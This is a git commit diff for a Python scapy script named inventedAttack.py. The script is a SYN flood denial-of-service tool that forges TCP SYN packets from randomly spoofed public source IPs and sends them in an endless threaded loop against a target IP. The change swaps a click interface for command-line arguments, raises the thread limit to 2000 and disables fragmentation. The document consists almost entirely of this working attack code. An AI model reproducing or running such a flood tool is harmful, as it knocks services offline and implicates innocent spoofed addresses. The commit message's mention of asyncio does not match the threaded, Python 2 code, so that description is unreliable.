b781cb3cff7e5b2729ae87032e3bb6cb0a0565ac
David Carracedo <david@adaformacion.es>
2019-03-11 18:58:46 +0100

    Rewrote for python3 asyncio, makes no difference at all in performance but I'm leaving this branch anyways for testing purposes

--- inventedAttack.py
+++ inventedAttack.py
@@ -11,34 +11,31 @@
 import random
 import sys
 import threading
-import click
 from scapy.all import *
-from faker import Faker
 
-
-targetIp = None
-targetPort = None
-threadLimit = 200
-fragSize = 500
+target = None
+port = None
+thread_limit = 2000
+total = 0
 payload="A"*2000
-fake = Faker()
-
 
 class sendSYN(threading.Thread):
-	global targetIp, targetPort, payload
+	global target, port, payload
 	def __init__(self):
 		threading.Thread.__init__(self)
 
 	def run(self):
 		#Layer 3 forging
 		ip = IP()
-		ip.src = fake.ipv4_public(network=False, address_class=None)
-		ip.dst = targetIp
+		#Here comes the IP spoogin part, taking a big chunk of the
+		#usable public IPv4 space at random.
+		ip.src = "%i.%i.%i.%i" % (random.randint(193,222),random.randint(1,254),random.randint(1,254),random.randint(1,254))
+		ip.dst = target
 
 		#Layer 4 forging
 		tcp = TCP()
 		tcp.sport = random.randint(1025,65535)
-		tcp.dport = targetPort
+		tcp.dport = 80
 		#Here comes the SYN flood mechanic part, yes, that easy
 		#Only make sure you don't respond with another script!
 		tcp.flags = 'S'
@@ -46,30 +43,25 @@ class sendSYN(threading.Thread):
 		#The actual packet
 		packet=ip/tcp/payload
 		#And finally the fagmentation and sending the fragments part
-		frags=fragment(packet,fragsize=fragSize)
-		for fragments in frags:
-			send(fragments,verbose=0)
+		#frags=fragment(packet,fragsize=500)
+		#for fragments in frags:
+		send(packet,verbose=0)
 
 
 if __name__ == "__main__":
+	if len(sys.argv) != 3:
+		print "Usage: %s <Target IP> <Port>" % sys.argv[0]
+		exit()
 
-	@click.command()
-	@click.option('--ip', '-i', prompt=True, help='IP address of the target machine')
-	@click.option('--port', '-p', type=(int),prompt=True, help='Port of the service to attack with SYN Flood')
-	@click.option('--threads', '-t', type=(int), prompt=True,help='Number of concurrent threads')
-	@click.option('--size', '-s', type=(int), prompt=True,help='Fragment size')
-	def start(ip,port,threads,size):
-		global targetIp,targetPort, threadLimit, fragSize
-		targetIp = ip
-		targetPort = port
-		threadLimit = threads
-		fragSize = size
-		total = 0
-		print ("Flooding %s:%s with SYN fragmented packets" % (ip,port))
-		while True:
-			if threading.activeCount() < threadLimit:
-				sendSYN().start()
-				total+=1
-				sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
+	target = sys.argv[1]
+	port = int(sys.argv[2])
 
-	start()
+
+	print "Flooding %s:%i with SYN fragmented packets" % (target,port)
+	while True:
+		if threading.activeCount() < thread_limit:
+			sendSYN().start()
+			total+=1
+			sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
+
+
